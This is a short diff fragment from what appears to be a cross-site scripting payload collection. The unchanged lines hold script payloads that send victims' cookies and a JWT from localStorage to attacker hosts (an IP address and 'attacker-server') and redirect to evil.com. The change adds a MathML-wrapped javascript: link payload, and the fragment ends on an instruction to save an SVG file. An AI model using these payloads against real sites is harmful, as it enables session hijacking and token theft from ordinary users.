@@ -37,6 +37,12 @@ document.location="https://attacker-server?victim_jwt_token"+document.localStora
 <script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
 <script>window.location.replace("http://evil.com");</script> 
 
+<math>
+ <xss href="javascript:alert(31337)">
+ Click Me
+ </xss>
+</math>
+
 
 --save it as sam.svg
 <svg width="200" height="200"
